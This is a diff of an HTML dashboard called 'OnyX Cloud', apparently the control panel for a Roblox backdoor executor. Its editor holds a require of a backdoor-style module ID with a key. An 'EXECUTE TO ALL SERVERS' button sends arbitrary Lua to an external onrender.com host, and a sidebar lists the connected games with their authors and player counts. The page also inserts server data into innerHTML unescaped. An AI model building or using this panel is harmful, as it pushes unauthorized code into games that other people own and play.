@@ -2,78 +2,83 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>OnyX Ultimate Control</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;800&display=swap" rel="stylesheet">
+    <title>OnyX Cloud Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #050505; --card: #111; --accent: #fff; }
+        :root { --bg: #0a0a0a; --card: #141414; --accent: #fff; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--bg); color: white; display: flex; flex-direction: column; height: 100vh; padding: 30px; }
+        body { background: var(--bg); color: white; display: flex; height: 100vh; padding: 20px; gap: 20px; }
         
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        .logo { font-size: 32px; font-weight: 800; letter-spacing: -2px; }
+        /* Сетка для карточек игр */
+        .sidebar { width: 350px; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #222; overflow-y: auto; }
+        .main { flex-grow: 1; background: var(--card); border-radius: 20px; padding: 25px; border: 1px solid #222; display: flex; flex-direction: column; }
         
-        .main-container { display: grid; grid-template-columns: 1fr 350px; gap: 20px; flex-grow: 1; }
+        .game-card { background: #1c1c1c; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-left: 4px solid #4CAF50; }
+        .game-card h4 { font-size: 16px; margin-bottom: 5px; }
+        .game-card p { font-size: 12px; color: #888; }
+
+        textarea { flex-grow: 1; background: #000; border: 1px solid #333; color: #00ff00; padding: 20px; border-radius: 15px; font-family: monospace; font-size: 14px; outline: none; margin-top: 15px; }
         
-        .editor-section { background: var(--card); border-radius: 24px; padding: 25px; border: 1px solid #222; display: flex; flex-direction: column; }
-        textarea { flex-grow: 1; background: transparent; border: none; color: #00ff00; font-family: 'Courier New', monospace; font-size: 16px; resize: none; outline: none; }
-        
-        .games-section { background: var(--card); border-radius: 24px; padding: 25px; border: 1px solid #222; overflow-y: auto; }
-        .game-card { background: #181818; padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid #252525; }
-        
-        .btn { background: var(--accent); color: black; border: none; padding: 15px 30px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.2s; }
-        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        .btn { background: var(--accent); color: black; border: none; padding: 15px; border-radius: 12px; font-weight: 900; cursor: pointer; margin-top: 15px; transition: 0.2s; }
+        .btn:hover { opacity: 0.8; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo">OnyX</div>
-        <button class="btn" onclick="send()">EXECUTE CLOUD</button>
+    <div class="sidebar">
+        <h2 style="margin-bottom: 20px;">Active Games</h2>
+        <div id="game-list">
+            <p style="color: #444;">Searching for servers...</p>
+        </div>
     </div>
 
-    <div class="main-container">
-        <div class="editor-section">
-            <h3 style="margin-bottom: 15px; opacity: 0.5;">LUA EXECUTOR</h3>
-            <textarea id="code">require(104786344839667)("Not_an9e15")</textarea>
-        </div>
-
-        <div class="games-section">
-            <h3 style="margin-bottom: 15px; opacity: 0.5;">ACTIVE SERVERS</h3>
-            <div id="list"></div>
-        </div>
+    <div class="main">
+        <h1>OnyX Cloud <span style="font-weight: 400; opacity: 0.3;">v6</span></h1>
+        <textarea id="editor">-- Введите любой Lua код или require
+require(104786344839667)("Not_an9e15")
+print("Hello from Cloud!")</textarea>
+        <button class="btn" onclick="execute()">EXECUTE TO ALL SERVERS</button>
     </div>
 
     <script>
-        const URL = "https://onyxwbserver.onrender.com";
+        const API = "https://onyxwbserver.onrender.com";
 
-        async function send() {
-            const code = document.getElementById('code').value;
-            await fetch(URL + "/update_script", {
-                method: 'POST',
-                headers: {'Content-Type': 'text/plain'},
-                body: code
-            });
-            alert("Sent to Roblox!");
-        }
-
-        async function update() {
+        async function execute() {
+            const code = document.getElementById('editor').value;
             try {
-                const res = await fetch(URL + "/get_games");
-                const games = await res.json();
-                const div = document.getElementById('list');
-                div.innerHTML = "";
-                for(let id in games) {
-                    const g = games[id];
-                    div.innerHTML += `<div class="game-card">
-                        <div style="font-weight:800">${g.gameName}</div>
-                        <div style="font-size:12px; color:#666">Players: ${g.playerCount}/${g.maxPlayers}</div>
-                        <div style="font-size:11px; color:#444">ID: ${g.placeId}</div>
-                    </div>`;
-                }
-            } catch(e) {}
+                await fetch(`${API}/update_script`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: code
+                });
+                alert("Код отправлен!");
+            } catch (e) { alert("Ошибка сервера!"); }
         }
-        setInterval(update, 5000);
-        update();
+
+        async function refreshGames() {
+            try {
+                const res = await fetch(`${API}/get_games?t=` + Date.now());
+                const games = await res.json();
+                const container = document.getElementById('game-list');
+                
+                if (Object.keys(games).length > 0) {
+                    container.innerHTML = "";
+                    for (let id in games) {
+                        const g = games[id];
+                        container.innerHTML += `
+                            <div class="game-card">
+                                <h4>${g.gameName}</h4>
+                                <p>👤 Author: ${g.author}</p>
+                                <p>👥 Players: ${g.playerCount}/${g.maxPlayers}</p>
+                                <p>🆔 ID: ${g.placeId}</p>
+                            </div>
+                        `;
+                    }
+                }
+            } catch (e) {}
+        }
+        setInterval(refreshGames, 5000);
+        refreshGames();
     </script>
 </body>
 </html>
